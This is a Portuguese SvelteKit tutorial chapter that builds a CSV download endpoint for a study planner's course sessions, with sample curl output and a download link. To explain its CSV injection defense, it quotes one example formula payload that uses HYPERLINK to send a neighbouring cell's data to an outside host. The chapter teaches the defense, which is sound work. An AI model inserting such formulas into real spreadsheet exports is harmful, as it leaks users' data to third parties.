---
title: Um download, e um CSV escrito com cuidado
version: 1
---

**Um endpoint pode responder com qualquer tipo de arquivo, porque um `Response` é só um corpo e alguns
cabeçalhos.** Um estudante que quer as suas sessões numa planilha precisa de um arquivo CSV, e a página
do curso é o lugar para oferecê-lo. Salve isto como
`src/routes/(planner)/courses/[id=slug]/sessions.csv/+server.js`:

```schooling-example
{"language": "javascript", "file": "src/routes/(planner)/courses/[id=slug]/sessions.csv/+server.js", "parts": [
 {"code": "// +server.js: a course's sessions as a CSV file, for a spreadsheet.\nimport { error } from '@sveltejs/kit';\nimport { readPlanner } from '#lib/server/planner.js';"},
 {"code": "export async function GET({ params }) {\n\tconst { courses, sessions } = await readPlanner();\n\tconst course = courses.find((c) => c.id === params.id);\n\tif (!course) error(404, `There is no course called “${params.id}”.`);\n\n\tconst rows = sessions\n\t\t.filter((s) => s.course === course.id)\n\t\t.toSorted((a, b) => (a.date < b.date ? -1 : 1))\n\t\t.map((s) => [course.name, s.date, s.minutes, s.done ? 'yes' : 'no']);", "note": "A pasta fica dentro da do curso, então `params.id` é o curso aqui também, conferido pelo mesmo matcher."},
 {"code": "\tconst text = [['course', 'date', 'minutes', 'done'], ...rows].map((row) => row.map(cell).join(',')).join('\\r\\n') + '\\r\\n';\n\n\treturn new Response(text, {\n\t\theaders: {\n\t\t\t'Content-Type': 'text/csv; charset=utf-8',", "note": "As linhas de um CSV terminam com um retorno de carro e uma quebra de linha, que é o que a especificação do formato pede e o que as planilhas esperam."},
 {"code": "\t\t\t'Content-Disposition': `attachment; filename=\"${course.id}-sessions.csv\"`\n\t\t}\n\t});\n}", "note": "`attachment` pede ao navegador que salve o arquivo em vez de mostrá-lo, com este nome."},
 {"code": "// A value as a CSV cell: with a leading apostrophe if a spreadsheet would take it for a\n// formula, and in quotes if it holds a comma, a quote or a line break.\nfunction cell(value) {\n\tlet text = String(value);\n\tif (/^[=+\\-@]/.test(text)) text = `'${text}`;\n\treturn /[\",\\r\\n]/.test(text) ? `\"${text.replaceAll('\"', '\"\"')}\"` : text;\n}", "note": "Duas regras, e a segunda é sobre segurança, não sobre formato."}
]}
```

```
ana@dev:~/planner$ curl -si http://localhost:5173/courses/algebra/sessions.csv
HTTP/1.1 200 OK
Vary: Origin
content-disposition: attachment; filename="algebra-sessions.csv"
content-type: text/csv; charset=utf-8
referrer-policy: same-origin
x-content-type-options: nosniff
x-frame-options: DENY
content-length: 127
Date: Sat, 24 Oct 2026 01:13:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

course,date,minutes,done
Linear algebra,2026-10-13,60,yes
Linear algebra,2026-10-19,90,yes
Linear algebra,2026-10-24,60,no
```

**Por que o apóstrofo.** Uma planilha que abre um arquivo CSV trata uma célula que começa com `=`, `+`,
`-` ou `@` como fórmula e a executa. Um curso chamado `=HYPERLINK("https://example.com/?"&A2,"Open")`
viraria um link que manda a célula ao lado para outro site quando alguém clica nele, e outras fórmulas já
fizeram coisa pior. Os nomes do planner são escritos pelo próprio dono, então o perigo aqui é pequeno;
numa aplicação em que o texto vem de outras pessoas, é um ataque de verdade, chamado **CSV injection**
(injeção em CSV), e o apóstrofo, que faz a planilha mostrar o texto como texto, é a defesa de costume.

## Um link para ele

A página do curso oferece o arquivo com um link comum. Substitua
`src/routes/(planner)/courses/[id=slug]/+page.svelte`:

```schooling-example
{"language": "html", "file": "src/routes/(planner)/courses/[id=slug]/+page.svelte", "parts": [
 {"code": "<script>\n\timport { enhance } from '$app/forms';\n\timport { format } from '#lib/week.js';\n\timport { getPlanner } from '#lib/context.js';\n\timport WeekNav from '#lib/WeekNav.svelte';\n\timport WeekTotal from '#lib/WeekTotal.svelte';\n\timport List from '#lib/List.svelte';\n\timport AddSession from '#lib/AddSession.svelte';\n\n\tlet { data } = $props();\n\n\tconst planner = getPlanner();\n\tlet course = $derived(data.course);\n\tlet sessions = $derived(planner.sessionsFor(course.id));\n</script>\n\n<svelte:head>\n\t<title>{course.name} · Study planner</title>\n</svelte:head>\n<h1>{course.name}</h1>\n<WeekNav week={planner.week} />\n<List items={sessions}>\n\t{#snippet row(session)}\n\t\t<form method=\"POST\" action=\"?week={planner.week}&/done\" use:enhance>\n\t\t\t<input type=\"hidden\" name=\"id\" value={session.id} />\n\t\t\t<input type=\"hidden\" name=\"done\" value={session.done ? 'no' : 'yes'} />\n\t\t\t<span class:done={session.done}>{format(session.date)}, {session.minutes} min</span>\n\t\t\t<button aria-label=\"{session.done ? 'Mark not done' : 'Mark done'}: {format(session.date)}\">\n\t\t\t\t{session.done ? 'Mark not done' : 'Mark done'}\n\t\t\t</button>\n\t\t</form>\n\t{/snippet}\n\t{#snippet empty()}\n\t\t<p>Nothing planned for {course.name} this week.</p>\n\t{/snippet}\n</List>\n<WeekTotal minutes={planner.byCourse[course.id] ?? 0} label=\"for {course.name} this week\" />\n{#key planner.week}\n\t<AddSession action=\"?week={planner.week}&/add\" />\n{/key}"},
 {"code": "<p><a href=\"/courses/{course.id}/sessions.csv\" download>Download all {course.name} sessions (CSV)</a></p>", "note": "`download` faz o navegador salvar aquilo para onde o link aponta, e o roteador do SvelteKit deixa esses links por conta do navegador. O arquivo tem todas as sessões do curso, não só as desta semana, e o texto do link diz isso."},
 {"code": "<style>\n\t.done {\n\t\ttext-decoration: line-through;\n\t}\n</style>"}
]}
```

```
ana@dev:~/planner$ look http://localhost:5173/courses/algebra | tail -3
  - paragraph:
    - link "Download all Linear algebra sessions (CSV)":
      - /url: /courses/algebra/sessions.csv
```
